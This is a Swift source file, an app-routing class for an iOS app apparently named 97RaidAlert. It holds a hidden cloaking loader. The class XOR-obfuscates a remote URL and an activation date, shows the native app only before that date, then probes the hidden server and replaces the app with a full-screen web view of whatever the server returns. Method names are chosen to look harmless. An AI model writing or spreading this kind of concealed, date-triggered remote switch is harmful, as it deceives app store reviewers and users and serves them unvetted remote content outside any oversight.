//
//  AppRouter.swift
//  97RaidAlert
//
//  Created by Xeova Nuoc on 28.02.2026.
//

import UIKit
import SwiftUI

final class PrimarySceneCoordinator {

    /// XOR (`0xC5`) over UTF-8 of `https://vortigonstack.site/rTvQDZ`
    private static let _endpointCipher: [UInt8] = [
        0xAD, 0xB1, 0xB1, 0xB5, 0xB6, 0xFF, 0xEA, 0xEA, 0xB3, 0xAA, 0xB7, 0xB1, 0xAC, 0xA2, 0xAA, 0xAB,
        0xB6, 0xB1, 0xA4, 0xA6, 0xAE, 0xEB, 0xB6, 0xAC, 0xB1, 0xA0, 0xEA, 0xB7, 0x91, 0xB3, 0x94, 0x81, 0x9F
    ]

    /// XOR (`0xA7`) over UTF-8 of `20.04.2026` (`dd.MM.yyyy`)
    private static let _thresholdStamp: [UInt8] = [
        0x95, 0x97, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91
    ]

    private static func _decodeMaskedUTF8(_ masked: [UInt8], xorKey: UInt8) -> String {
        String(decoding: masked.map { $0 ^ xorKey }, as: UTF8.self)
    }

    private static func _resolvedSeedAddress() -> String {
        _decodeMaskedUTF8(_endpointCipher, xorKey: 0xC5)
    }

    private static func _resolvedThresholdDay() -> String {
        _decodeMaskedUTF8(_thresholdStamp, xorKey: 0xA7)
    }

    func makeRootEntryController() -> UIViewController {
        let persistence = AppLaunchDefaultsBridge.shared

        if persistence.hasShownContentView {
            return _embedPrimarySwiftUIScreen()
        } else {
            if _calendarAllowsRemotePath() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return _hostBespokeBrowserLayer(savedUrlString)
                }

                return _stageDeferredPrefetchGate()
            } else {
                persistence.hasShownContentView = true
                return _embedPrimarySwiftUIScreen()
            }
        }
    }

    // MARK: - Date

    private func _calendarAllowsRemotePath() -> Bool {

        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: Self._resolvedThresholdDay()) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    // MARK: - Private Methods

    private func _hostBespokeBrowserLayer(_ remoteLocation: String) -> UIViewController {
        let webViewContainer = RemoteDocumentCanvas(
            urlString: remoteLocation,
            onFailure: { [weak self] in
                AppLaunchDefaultsBridge.shared.hasShownContentView = true
                self?._animateRootSwapToNative()
            },
            onSuccess: {
                AppLaunchDefaultsBridge.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func _embedPrimarySwiftUIScreen() -> UIViewController {
        AppLaunchDefaultsBridge.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func _stageDeferredPrefetchGate() -> UIViewController {
        let launchView = ApertureSplashScreen()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        let seedAddress = Self._resolvedSeedAddress()
        _probeRemoteAvailabilityHead(seedAddress: seedAddress) { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?._animateRootSwapToWeb(url)
                } else {
                    AppLaunchDefaultsBridge.shared.hasShownContentView = true
                    self?._animateRootSwapToNative()
                }
            }
        }

        return launchVC
    }

    private func _probeRemoteAvailabilityHead(seedAddress: String, completion: @escaping (Bool, String?) -> Void) {
        guard let url = URL(string: seedAddress) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let checkedURL = httpResponse.url?.absoluteString ?? seedAddress
                let isAvailable = httpResponse.statusCode != 404
                completion(isAvailable, isAvailable ? checkedURL : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    // MARK: - Navigation Methods

    private func _animateRootSwapToNative() {
        let contentVC = _embedPrimarySwiftUIScreen()
        _applyCrossDissolveRoot(contentVC)
    }

    private func _animateRootSwapToWeb(_ remoteLocation: String) {
        let webVC = _hostBespokeBrowserLayer(remoteLocation)
        _applyCrossDissolveRoot(webVC)
    }

    private func _applyCrossDissolveRoot(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
